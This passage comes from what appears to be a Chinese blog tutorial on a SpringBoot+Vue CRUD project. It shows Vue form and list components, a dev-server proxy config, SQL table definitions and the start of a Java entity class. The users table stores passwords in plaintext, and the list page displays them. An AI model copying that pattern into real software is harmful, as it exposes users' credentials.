class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;div&gt;<br>    &lt;el-card class=&quot;person-card&quot;&gt;<br>      &lt;h2&gt;person表(插入或更新)&lt;/h2&gt;<br>      &lt;el-form<br>        :model=&quot;ruleForm&quot;<br>        status-icon<br>        :rules=&quot;rules&quot;<br>        ref=&quot;ruleFormRef&quot;<br>        label-position=&quot;left&quot;<br>        label-width=&quot;80px&quot;<br>        class=&quot;demo-ruleForm&quot;<br>      &gt;<br>        &lt;el-form-item label=&quot;username&quot; prop=&quot;username&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.username&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;name&quot; prop=&quot;name&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.name&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;age&quot; prop=&quot;age&quot;&gt;<br>          &lt;el-input v-model.number=&quot;ruleForm.age&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>        &lt;el-form-item label=&quot;teleno&quot; prop=&quot;teleno&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.teleno&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>      &lt;/el-form&gt;<br>      &lt;div class=&quot;btnGroup&quot;&gt;<br>        &lt;el-button<br>          type=&quot;primary&quot;<br>          @click=&quot;confirmAdd(&#x27;ruleFormRef&#x27;)&quot;<br>          v-loading=&quot;loading1&quot;<br>          &gt;提交&lt;/el-button<br>        &gt;<br>        &lt;!--        &lt;el-button type=&quot;primary&quot; @click=&quot;submitForm(&#x27;ruleFormRef&#x27;)&quot;&gt;提交&lt;/el-button&gt;--&gt;<br>        &lt;el-button @click=&quot;resetForm(&#x27;ruleFormRef&#x27;)&quot;&gt;重置&lt;/el-button&gt;<br>        &lt;router-link to=&quot;/list&quot;&gt;<br>          &lt;el-button style=&quot;margin-left: 10px&quot;&gt;查看&lt;/el-button&gt;<br>        &lt;/router-link&gt;<br>      &lt;/div&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br><br>  &lt;div&gt;<br>    &lt;el-card class=&quot;user-card&quot;&gt;<br>      &lt;h2&gt;user表(删除)&lt;/h2&gt;<br>      &lt;el-form<br>        :model=&quot;ruleForm&quot;<br>        status-icon<br>        :rules=&quot;rules&quot;<br>        ref=&quot;ruleFormRef2&quot;<br>        label-position=&quot;left&quot;<br>        label-width=&quot;80px&quot;<br>        class=&quot;demo-ruleForm&quot;<br>      &gt;<br>        &lt;el-form-item label=&quot;username&quot; prop=&quot;username2&quot;&gt;<br>          &lt;el-input v-model=&quot;ruleForm.username2&quot;&gt;&lt;/el-input&gt;<br>        &lt;/el-form-item&gt;<br>      &lt;/el-form&gt;<br>      &lt;div class=&quot;btnGroup&quot;&gt;<br>        &lt;el-button<br>          type=&quot;primary&quot;<br>          @click=&quot;confirmDelete(&#x27;ruleFormRef2&#x27;)&quot;<br>          v-loading=&quot;loading2&quot;<br>          &gt;提交&lt;/el-button<br>        &gt;<br>        &lt;el-button @click=&quot;resetForm(&#x27;ruleFormRef2&#x27;)&quot;&gt;重置&lt;/el-button&gt;<br>        &lt;router-link to=&quot;/list&quot;&gt;<br>          &lt;el-button style=&quot;margin-left: 10px&quot;&gt;查看&lt;/el-button&gt;<br>        &lt;/router-link&gt;<br>        &lt;!--        &lt;el-button type=&quot;primary&quot; @click=&quot;submitForm(&#x27;ruleForm&#x27;)&quot;&gt;提交&lt;/el-button&gt;--&gt;<br>      &lt;/div&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import axios from &quot;axios&quot;;<br>export default &#123;<br>  data() &#123;<br>    //年龄格式检查<br>    const checkAge = (rule, value, callback) =&gt; &#123;<br>      // setTimeout(() =&gt; &#123;<br>      if (!Number.isInteger(value) &amp;&amp; value !== &quot;&quot;) &#123;<br>        callback(new Error(&quot;请输入数字&quot;));<br>      &#125; else &#123;<br>        if (value &gt; 150) &#123;<br>          callback(new Error(&quot;您也太老了吧&quot;));<br>        &#125; else &#123;<br>          callback();<br>        &#125;<br>      &#125;<br>      // &#125;, 1000);<br>    &#125;;<br>    //电话格式检查<br>    const validateTeleno = (rule, value, callback) =&gt; &#123;<br>      if (value.length &gt; 11) &#123;<br>        callback(new Error(&quot;请输入正确的手机号&quot;));<br>      &#125; else &#123;<br>        callback();<br>      &#125;<br>    &#125;;<br>    return &#123;<br>      ruleForm: &#123;<br>        username: &quot;&quot;,<br>        name: &quot;&quot;,<br>        age: &quot;&quot;,<br>        teleno: &quot;&quot;,<br>        username2: &quot;&quot;,<br>      &#125;,<br>      //设计输入校验规则<br>      rules: &#123;<br>        username: [<br>          &#123; required: true, message: &quot;用户名不能为空！&quot;, trigger: &quot;blur&quot; &#125;,<br>        ],<br>        name: [&#123; required: true, message: &quot;名字不能为空！&quot;, trigger: &quot;blur&quot; &#125;],<br>        age: [&#123; validator: checkAge, trigger: &quot;blur&quot; &#125;], //采用前面定义的校验规则<br>        teleno: [&#123; validator: validateTeleno, trigger: &quot;blur&quot; &#125;],<br>        username2: [<br>          &#123; required: true, message: &quot;用户名不能为空！&quot;, trigger: &quot;blur&quot; &#125;,<br>        ],<br>      &#125;,<br>      loading1: false, // 是否显示加载动画<br>      loading2: false,<br>    &#125;;<br>  &#125;,<br>  methods: &#123;<br>    addData() &#123;<br>      this.loading1 = true;<br>      //2.使用axios 进行get请求<br>      axios<br>        .post(&quot;/api/person/add&quot;, &#123;<br>          username: this.ruleForm.username,<br>          name: this.ruleForm.name,<br>          age: this.ruleForm.age,<br>          teleno: this.ruleForm.teleno,<br>        &#125;)<br>        .then((res) =&gt; &#123;<br>          //请求成功的回调函数<br>          if (res.data.code === &quot;0&quot;) &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>          &#125; else &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;error&quot;,<br>            &#125;);<br>          &#125;<br>          this.loading1 = false;<br>          console.log(res);<br>        &#125;)<br>        .catch((err) =&gt; &#123;<br>          //请求失败的回调函数<br>          console.log(err);<br>        &#125;);<br>    &#125;,<br>    deleteData() &#123;<br>      this.loading2 = true;<br>      //2.使用axios 进行get请求<br>      console.log(this.ruleForm.username2);<br>      axios<br>        .post(<br>          &quot;/api/user/delete&quot;,<br>          &#123;&#125;,<br>          &#123;<br>            //必须要加中间那个括号,不然无法工作<br>            params: &#123;<br>              username: this.ruleForm.username2,<br>            &#125;,<br>          &#125;<br>        )<br>        .then((res) =&gt; &#123;<br>          //请求成功的回调函数<br>          if (res.data.code === &quot;0&quot;) &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>          &#125; else &#123;<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;error&quot;,<br>            &#125;);<br>          &#125;<br>          this.loading2 = false;<br>          console.log(res);<br>        &#125;)<br>        .catch((err) =&gt; &#123;<br>          //请求失败的回调函数<br>          console.log(err);<br>        &#125;);<br>    &#125;,<br>    resetForm(formName) &#123;<br>      this.$refs[formName].resetFields();<br>      this.loading1 = false;<br>      this.loading2 = false;<br>    &#125;,<br>    //添加格式校验和提交确定<br>    confirmAdd(formName) &#123;<br>      this.$refs[formName].validate((valid) =&gt; &#123;<br>        if (valid) &#123;<br>          this.$confirm(<br>            &quot;是否确认添加用户:&quot; + this.ruleForm.username + &quot;  ?&quot;,<br>            &quot;提示&quot;,<br>            &#123;<br>              confirmButtonText: &quot;确定&quot;,<br>              cancelButtonText: &quot;取消&quot;,<br>              type: &quot;warning&quot;,<br>            &#125;<br>          )<br>            .then(() =&gt; &#123;<br>              this.addData();<br>            &#125;)<br>            .catch(() =&gt; &#123;<br>              this.$message(&#123;<br>                type: &quot;info&quot;,<br>                message: &quot;已取消添加用户&quot;,<br>              &#125;);<br>            &#125;);<br>        &#125; else &#123;<br>          console.log(&quot;error submit!&quot;);<br>          return false;<br>        &#125;<br>      &#125;);<br>    &#125;,<br>    //添加格式校验和提交确定<br>    confirmDelete(formName) &#123;<br>      this.$refs[formName].validate((valid) =&gt; &#123;<br>        if (valid) &#123;<br>          this.$confirm(<br>            &quot;是否确认删除用户:&quot; + this.ruleForm.username2 + &quot;  ?&quot;,<br>            &quot;提示&quot;,<br>            &#123;<br>              confirmButtonText: &quot;确定&quot;,<br>              cancelButtonText: &quot;取消&quot;,<br>              type: &quot;warning&quot;,<br>            &#125;<br>          )<br>            .then(() =&gt; &#123;<br>              this.deleteData();<br>            &#125;)<br>            .catch(() =&gt; &#123;<br>              this.$message(&#123;<br>                type: &quot;info&quot;,<br>                message: &quot;已取消删除用户&quot;,<br>              &#125;);<br>            &#125;);<br>        &#125; else &#123;<br>          console.log(&quot;error submit!&quot;);<br>          return false;<br>        &#125;<br>      &#125;);<br>    &#125;,<br>  &#125;,<br>&#125;;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>/* 设置person面板居中 */<br>.person-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 400px;<br>&#125;<br>/* 设置person面板中的表单居中 */<br>.user-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 400px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure><h3 id="5设计listpage"><a class="markdownIt-Anchor" href="#5设计listpage"></a> 5.设计listPage</h3><p>该组件是结果展示界面</p><p>最终效果如图：</p><p><img src="/posts/3de7737d/image-20220418163131246.png" alt="image-20220418163131246"></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;router-link to=&quot;/index&quot;&gt;<br>    &lt;el-button style=&quot;margin: 100px auto 20px auto&quot;&gt;返回主页&lt;/el-button&gt;<br>  &lt;/router-link&gt;<br>  &lt;div&gt;<br>    &lt;el-card class=&quot;user-card&quot;&gt;<br>      &lt;p&gt;User表&lt;/p&gt;<br>      &lt;el-table<br>          :data=&quot;tableDataUser&quot;<br>          style=&quot;width: 100%&quot;<br>          max-height=&quot;250&quot;<br>          border&gt;<br>        &lt;el-table-column prop=&quot;username&quot; label=&quot;username&quot; width=&quot;360&quot; /&gt;<br>        &lt;el-table-column prop=&quot;pass&quot; label=&quot;password&quot; width=&quot;360&quot; /&gt;<br>      &lt;/el-table&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br><br><br>  &lt;div&gt;<br>    &lt;el-card class=&quot;person-card&quot;&gt;<br>      &lt;p&gt;Person表&lt;/p&gt;<br>      &lt;el-table<br>          :data=&quot;tableDataPerson&quot;<br>          style=&quot;width: 100%&quot;<br>          max-height=&quot;250&quot;<br>          border&gt;<br>        &lt;el-table-column prop=&quot;username&quot; label=&quot;username&quot; width=&quot;180&quot; /&gt;<br>        &lt;el-table-column prop=&quot;name&quot; label=&quot;name&quot; width=&quot;180&quot; /&gt;<br>        &lt;el-table-column prop=&quot;age&quot; label=&quot;age&quot; width=&quot;180&quot;/&gt;<br>        &lt;el-table-column prop=&quot;teleno&quot; label=&quot;teleno&quot; width=&quot;180&quot;/&gt;<br>      &lt;/el-table&gt;<br>    &lt;/el-card&gt;<br>  &lt;/div&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>import axios from &quot;axios&quot;;<br><br>export default &#123;<br>  data() &#123;<br>    return &#123;<br>      tableDataPerson: [],<br>      tableDataUser:[]<br>    &#125;<br>  &#125;,<br>  methods: &#123;<br>    getPersonData() &#123;<br>      //2.使用axios 进行get请求<br>      axios<br>          .get(&quot;/api/person/list&quot;)<br>          .then((res) =&gt; &#123;<br>            //请求成功的回调函数<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>            this.tableDataPerson=res.data.data<br>            for (const p in this.tableDataPerson) &#123;//遍历json数组,将为0的age置为null<br>              if(this.tableDataPerson[p].age===0)this.tableDataPerson[p].age =null;<br>            &#125;<br>            console.log(res);<br>          &#125;)<br>          .catch((err) =&gt; &#123;<br>            //请求失败的回调函数<br>            console.log(err);<br>          &#125;);<br>    &#125;,<br>    getUserData() &#123;<br>      //2.使用axios 进行get请求<br>      axios<br>          .get(&quot;/api/user/list&quot;)<br>          .then((res) =&gt; &#123;<br>            //请求成功的回调函数<br>            this.$message(&#123;<br>              message: res.data.msg,<br>              showClose: true,<br>              type: &quot;success&quot;,<br>            &#125;);<br>            this.tableDataUser=res.data.data<br>            this.loading= false ;<br>            console.log(res);<br>          &#125;)<br>          .catch((err) =&gt; &#123;<br>            //请求失败的回调函数<br>            console.log(err);<br>          &#125;);<br>    &#125;,<br>  &#125;,<br>  mounted:function()&#123;<br>    this.getPersonData();<br>    this.getUserData()<br>    console.log(&quot;查看成功&quot;);<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style scoped&gt;<br>/* 设置面板居中 */<br>.user-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 720px;<br>&#125;<br>/* 设置面板中的表单居中 */<br>.person-card &#123;<br>  margin: auto auto 20px auto;<br>  width: 720px;<br>&#125;<br>&lt;/style&gt;<br></code></pre></div></td></tr></table></figure><h3 id="6配置代理"><a class="markdownIt-Anchor" href="#6配置代理"></a> 6.配置代理</h3><blockquote><p>在正式开始写登录注册与后端的交互之前，我们先在前端处理一下跨域问题。跨域问题可以简单理解成如果你的前端项目的<strong>IP地址</strong>和<strong>端口号</strong>和后端的<strong>IP地址</strong>和<strong>端口号</strong>不一样，就会导致前端无法获取到数据，这是一个规定。而在前后端分离开发的项目中，前后端项目的端口号一般都是不一样的，比如我们这个项目的前端端口号是 8080，后端端口号是 8081，所以一定会造成跨域访问的问题，跨域访问的问题可以在前端解决也可以在后端解决，前端一般采用代理服务器的方式，因此这里我们也通过配置代理服务器的方法来处理跨域问题。</p></blockquote><p>修改vue.config.js文件如下</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; defineConfig &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@vue/cli-service&#x27;</span>)<br><span class="hljs-built_in">module</span>.exports = defineConfig(&#123;<br>  <span class="hljs-attr">lintOnSave</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 关闭语法检测</span><br>  <span class="hljs-attr">transpileDependencies</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">devServer</span>: &#123;<br>    <span class="hljs-comment">// 代理服务器可以将路由中的指定前缀转发到指定的后端服务器中</span><br>    <span class="hljs-attr">proxy</span>: &#123;<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        <span class="hljs-attr">target</span>: <span class="hljs-string">&#x27;http://localhost:8081/&#x27;</span>,<br>        <span class="hljs-attr">ws</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否启用websockets</span><br>        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 代理时是否更改host</span><br>        <span class="hljs-attr">pathRewrite</span>: &#123;<br>          <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//这里理解成用&#x27;/api&#x27;代替target里面的地址</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>&#125;)<br></code></pre></div></td></tr></table></figure><p>修改完这个配置需要重启下前端项目才会生效</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">npm run serve<br></code></pre></div></td></tr></table></figure><p>结合后端项目，不出意外的话，就可以实现在前端操作数据库了，这个前后端分离的项目就完成了。</p><video src="vue项目入门(调用spring boot接口)/QQ录屏20220418165319.mp4"><p>参考：</p><p><a href="https://www.makerhu.com/posts/78e35d03/">Vue 实现登录注册功能（前后端分离完整案例）</a></p><p>关于vue的教程，<a href="https://cli.vuejs.org/zh/">vue官网</a>有详细的教程</p></video>]]></content>
    
    
    <categories>
      
      <category>Project</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>vue</tag>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot+Vue前后端分离项目之后端SpringBoot部分</title>
    <link href="/posts/c43b2e6b/"/>
    <url>/posts/c43b2e6b/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文章对SpringBoot开发后端项目结构做了简单介绍，并实现了用SpringBoot+MySQL实现操作数据库增删改查的后端功能，与本博客的另一篇文章 <a href="https://www.makerhu.com/posts/78e35d03/">SpringBoot+Vue前后端分离项目之前端vue部分</a>共同组成了前后端分离项目的整体。</p></blockquote><h2 id="一-环境准备"><a class="markdownIt-Anchor" href="#一-环境准备"></a> 一、环境准备</h2><p>编辑器：IDEA</p><p>数据库：mysql</p><p>接口测试工具：postman</p><h2 id="二-项目创建"><a class="markdownIt-Anchor" href="#二-项目创建"></a> 二、项目创建</h2><h3 id="数据库创建"><a class="markdownIt-Anchor" href="#数据库创建"></a> 数据库创建</h3><p>本实验数据库基于课程实验3的基础用java创建，当然也可以基于sql创建。</p><p>首先创建数据库test,然后创建两个表</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mysql">create table person(<br>    username varchar(10) not null,<br>    name varchar(20) not null,<br>    age int,<br>    teleno char(11),<br>    primary key ( name )<br>);<br>create table users(<br>    username varchar(10) not null,<br>    pass varchar(8) not null,<br>    primary key ( username )<br>);<br></code></pre></div></td></tr></table></figure><p>在idea项目新建项目中选择spring initializr</p><p>按下图选择</p><p><img src="/posts/c43b2e6b/image-20220418113029086.png" alt="image-20220418113029086"></p><p>安装下面三个依赖:</p><p>其中spring data JDBC依赖提供了JDCBtemplate的接口，可以让我们直接通过接口操作数据库</p><p>点击完成就创建好了一个项目</p><p><img src="/posts/c43b2e6b/image-20220418113151194.png" alt="image-20220418113151194"></p><p>初始项目结构如下</p><p>其中Ex4springApplication就是我们的主文件，通过这个来启动整个文件</p><p><img src="/posts/c43b2e6b/image-20220418113827792.png" alt="image-20220418113827792"></p><p>这样还不能成功启动，还需要配置一下数据库</p><p><img src="/posts/c43b2e6b/image-20220418130249742.png" alt="image-20220418130249742"></p><p>然后点击构建就可以看到项目成功启动了</p><p><img src="/posts/c43b2e6b/image-20220418130326779.png" alt="image-20220418130326779"></p><h2 id="三-项目结构"><a class="markdownIt-Anchor" href="#三-项目结构"></a> 三、项目结构</h2><p>下面展示一下最终项目的结构</p><p><img src="/posts/c43b2e6b/image-20220418124653232.png" alt="image-20220418124653232"></p><ul><li><p>数据持久层</p><p>目的是在java对象与数据库之间建立映射，也就是说它的作用是将某一个Java类对应到数据库中的一张表。在我们的项目中，就将创建一个实体类User映射到数据库的user表，表中的每个字段对应于实体类的每个属性。</p><ul><li><p>domain：存放实体类的包，比如User类，其作为对应数据库user表的一个实体类</p></li><li><p>repository: 存放一些数据访问类（也就是一些能操纵数据库的类）的包，比如存放能对user表进行增删改查的类，这一层也仅仅就是基础的增删改查，不附带额外的业务逻辑。</p></li></ul></li><li><p>业务逻辑层</p><p>的作用是处理业务逻辑。比如在本项目中，我们就在业务逻辑层实现具体插入删除的逻辑，像是插入person要连带着插入user等逻辑都写在这里</p><ul><li>service: 存放业务逻辑接口的包</li><li>serviceImpl: 存放业务逻辑实现类的包，其中的类实现service中的接口</li></ul></li><li><p>控制层</p><p>作用是接收视图层的请求并调用业务逻辑层的方法。比如视图层请求插入用户并发来了用户的信息，那么控制层就调用业务逻辑层的登录方法，并将用户信息作为参数传入，在将结果返回给视图层。</p><ul><li>controller: 存放控制器的包。比如UserController</li></ul></li><li><p><strong>视图层</strong>的作用是展现数据，本项目是纯后端，视图层基于在前端基于Vue实现，见另一篇博客。</p></li><li><p>剩下的utils包提供了统一输出结构的工具，config包提供了跨域配置。</p></li></ul><p>可以发现这样一个架构就是自底向上的，所以下面我们按照自底向上来创建项目。</p><p>首先按照上图把项目结构搭好，然后逐个完善。</p><h2 id="四-项目实现"><a class="markdownIt-Anchor" href="#四-项目实现"></a> 四、项目实现</h2><h3 id="1-数据持久层"><a class="markdownIt-Anchor" href="#1-数据持久层"></a> 1) 数据持久层</h3><h4 id="1-实现entity"><a class="markdownIt-Anchor" href="#1-实现entity"></a> 1. 实现entity</h4><h5 id="person"><a class="markdownIt-Anchor" href="#person"></a> Person</h5><p>首先创建Person类，然后创建数据表中对应的字段，数据类型要对应上</p><p>注意要添加<code>@Table(name = &quot;person&quot;)</code>和<code>@Entity</code>注解</p><ul><li><strong>@Table(name = “person”)</strong> 说明此实体类对应于数据库的person表</li><li><strong>@Entity</strong> 说明此类是个实体类</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zino.ex4spring.domain;<br><br><span class="hljs-keyword">import</span> javax.persistence.Entity;<br><span class="hljs-keyword">import</span> javax.persistence.Id;<br><span class="hljs-keyword">import</span> javax.persistence.Table;<br><br><span class="hljs-meta">@Table(name=&quot;person&quot;)</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> String teleno;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(String username,String name,Integer age,String teleno)</span></span>&#123;<br>        setUsername(username);<br>        setName(name);<br>        setAge(age);<br>        setTeleno(teleno);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span 